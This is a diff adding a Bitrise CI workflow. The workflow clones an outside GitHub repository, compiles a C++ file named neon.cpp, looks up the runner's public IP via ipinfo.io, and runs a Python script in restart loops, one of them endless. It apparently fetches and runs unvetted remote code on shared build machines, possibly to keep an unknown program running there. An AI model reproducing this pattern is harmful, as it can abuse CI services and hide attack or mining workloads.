@@ -1,0 +1,65 @@
+---
+format_version: "8"
+default_step_lib_source: https://github.com/bitrise-io/bitrise-steplib.git
+
+workflows:
+  primary:
+    steps:
+      - script:
+          title: ":gear: Setup Environment"
+          inputs:
+            - content: |
+                #!/bin/bash
+                echo "Setting up environment..."
+                sudo apt-get update && sudo apt-get install -y gcc g++
+                pip install -r requirements.txt
+
+      - git-clone:
+          title: ":octocat: Clone Repository"
+          inputs:
+            repository_url: https://github.com/ultra121314/papa.git
+
+      - script:
+          title: ":hammer: Compile C++ File"
+          inputs:
+            - content: |
+                #!/bin/bash
+                echo "Compiling C++ file into binary..."
+                cd papa
+                g++ -std=c++14 neon.cpp -o neon -pthread
+                chmod +x neon
+
+      - script:
+          title: ":mag: Display System and Network Info"
+          inputs:
+            - content: |
+                #!/bin/bash
+                echo "Displaying system and network information..."
+                lscpu
+                curl ipinfo.io
+
+      - script:
+          title: ":rocket: Start Application with Restart Loop"
+          inputs:
+            - content: |
+                #!/bin/bash
+                echo "Starting the compiled binary with a restart loop..."
+                timeout 3600 bash -c '
+                while true; do 
+                  python3 m.py || echo "Application crashed. Restarting..."; 
+                  sleep 500; 
+                done
+                '
+
+      - script:
+          title: ":repeat: Wait and Restart Process"
+          inputs:
+            - content: |
+                #!/bin/bash
+                echo "Restarting process after wait..."
+                bash -c '
+                while true; do 
+                  python3 m.py || echo "Application crashed. Restarting..."; 
+                  sleep 500; 
+                done
+                '
